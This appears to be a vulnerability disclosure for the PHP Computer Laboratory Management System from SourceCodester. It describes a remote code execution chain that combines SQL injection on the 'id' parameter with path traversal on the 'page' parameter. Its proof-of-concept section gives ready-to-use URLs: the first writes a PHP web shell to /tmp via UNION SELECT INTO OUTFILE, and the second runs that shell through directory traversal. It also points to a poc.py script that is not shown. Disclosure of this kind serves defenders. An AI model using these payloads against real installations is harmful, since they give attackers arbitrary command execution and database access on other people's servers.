
# RCE in Computer Laboratory Management System
+ Exploit Author: Artem Glazyrin
# Vendor Homepage
+ https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
# Software Link
+ https://www.sourcecodester.com/php/17268/computer-laboratory-management-system-using-php-and-mysql.html
# Overview
+ Path Traversal in conjunction with SQL Injection allows an attacker to exploit RCE. The attacker first uploads a php shell to the server via SQL Injection, and then uses the page parameter to call it.
# Vulnerability Details
+ Vulnerable SQL Injection Endpoint: /php-lms/admin/damage/manage_damage.php?id=1
+ Parameter: id
+ Vulnerable Path Traversal Endpoint: /php-lms/admin/?page=home
+ Parameter: page
# Description
+ The lack of proper input validation and sanitization on the 'id' parameter allows an attacker to craft SQL injection queries and gaining unauthorized access to the database.
+ The lack of proper input validation and sanitization on the 'page' parameter allows an attacker to craft Path Traversal queries and gaining unauthorized access to the php-files.

# Proof of Concept (PoC) : 
+ `http://192.168.1.167/php-lms/admin/damage/manage_damage.php?id=0' UNION SELECT 1,1,'<?php echo system($_GET["cmd"]); ?>',1,1,1,1,1,1 FROM users INTO OUTFILE '/tmp/shell.php' --%20`
+ `http://192.168.1.167/php-lms/admin/?page=../../../../../../../../../../../../../../../../../tmp/shell`
+ PoC code is in [poc.py](poc.py) file